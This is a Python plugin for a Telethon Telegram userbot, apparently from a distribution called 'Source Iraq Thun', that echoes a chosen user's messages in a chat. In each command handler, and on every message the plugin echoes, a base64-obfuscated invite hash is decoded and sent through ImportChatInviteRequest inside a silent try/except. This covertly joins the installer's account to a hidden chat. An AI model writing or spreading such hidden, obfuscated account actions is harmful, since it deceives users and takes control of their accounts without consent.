#Hello. These files are all private to Source Iraq Thun. 
#In short, there are files registered for Source, another group. 
#You do not need to write a file from the beginning for the sake of rights, 
#and there are complete files. Thank you for installing Iraq Thun. 
#Our channel is here: https://t.me/tele_thon


from .sql_helper.echo_sql import is_echo , get_all_echos , addecho , remove_echo
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
import asyncio
import pybase64
import io
from time import time
from userbot.utils import admin_cmd
from userbot  import CMD_HELP
import requests
from telethon import events, errors

@borg.on(admin_cmd(pattern="addecho"))
async def echo(cat):
    if cat.fwd_from:
        return
    if cat.reply_to_msg_id is not None:
        reply_msg = await cat.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = cat.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except:
            pass
        if is_echo(user_id, chat_id):
            await cat.edit("The user is already enabled with echo ")
            return
        addecho(user_id , chat_id)
        await cat.edit("Hi")
    else:
        await cat.edit("Reply To A User's Message to echo his messages")
        
@borg.on(admin_cmd(pattern="rmecho"))
async def echo(cat):
    if cat.fwd_from:
        return
    if cat.reply_to_msg_id is not None:
        reply_msg = await cat.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = cat.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id , chat_id)
            await cat.edit("No nearby Mountains to echo his messages")
        else:
            await cat.edit("The user is not activated with echo")   
    else:
        await cat.edit("Reply To A User's Message to echo his messages")
        
@borg.on(admin_cmd(pattern="listecho"))
async def echo(cat):
    if cat.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = requests.post('https://nekobin.com/api/documents', json={"content": output_str}).json().get('result').get('key')
        url = f'https://nekobin.com/{key}'
        reply_text = f'echo enabled users: [here]({url})'
        await cat.edit(reply_text)
    else:
        await cat.edit(output_str)
      
@borg.on(events.NewMessage(incoming=True))
async def samereply(cat):
    if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(cat.sender_id, cat.chat_id):
        await asyncio.sleep(2)
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await cat.client(hmm)
        except:
            pass
        if cat.message.text or cat.message.sticker:
            await cat.reply(cat.message)
